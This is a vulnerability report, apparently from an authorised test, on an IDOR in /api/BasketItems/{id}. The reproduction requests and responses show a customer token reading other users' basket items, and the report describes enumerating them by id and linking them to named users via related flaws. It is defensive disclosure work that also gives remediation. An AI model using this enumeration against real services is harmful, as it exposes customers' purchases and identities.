# IDOR on /api/BasketItems/{id} — foreign basket's line items readable

- **Severity:** high
- **Date (UTC):** 2026-11-19

## Details

## Summary
`GET /api/BasketItems/{id}` returns basket-item rows without verifying that the caller owns the parent basket. A customer-role JWT (`data.id=26, bid=7`) reads items whose `BasketId=1` (the admin's basket, not ours).

## Steps to reproduce
1. Log in as the test customer (id=26, bid=7).
2. `GET /api/BasketItems/1` with the customer token.
3. Observe `BasketId` in the response — if it differs from the caller's `bid`, no ownership check exists.

## Evidence
Request:
```http
GET /api/BasketItems/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <customer-jwt bid=7>
```
Response:
```json
{"status":"success","data":{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-11-18T10:16:50.234Z","updatedAt":"2026-11-18T10:16:50.234Z"}}
```

Second probe:
```http
GET /api/BasketItems/2 HTTP/1.1
```
```json
{"status":"success","data":{"ProductId":2,"BasketId":1,"id":2,"quantity":3,...}}
```

Caller's own basket id is `7`; both returned rows belong to `BasketId=1`.

## Impact
Any authenticated user enumerates every basket line item in the system by incrementing `id`. Exposes:
- which products other customers (and admins) are buying
- quantities + timestamps → order-pattern profiling
- combined with the `/rest/basket/{id}` IDOR already filed, full reconstruction of any user's cart contents
- when combined with the `/api/Users/{id}` IDOR, basket-items can be mapped back to named individuals + email addresses

PUT / DELETE on this endpoint were not probed (would be sabotage per skill rules); write-side risk should be assumed until verified by the vendor.

## Remediation
At the controller, before returning or mutating the row:
- Look up `BasketItem.BasketId` and verify `Basket.UserId === req.user.data.id`, **or** `req.user.data.role === 'admin'`.
- Deny-by-default on any id the caller cannot prove ownership of.

## References
- OWASP API Top 10 2023 — API1:2023 Broken Object Level Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
- Related: `reports/2026-11-19-high-idor-rest-basket.md`, `reports/2026-11-19-high-idor-api-users.md`
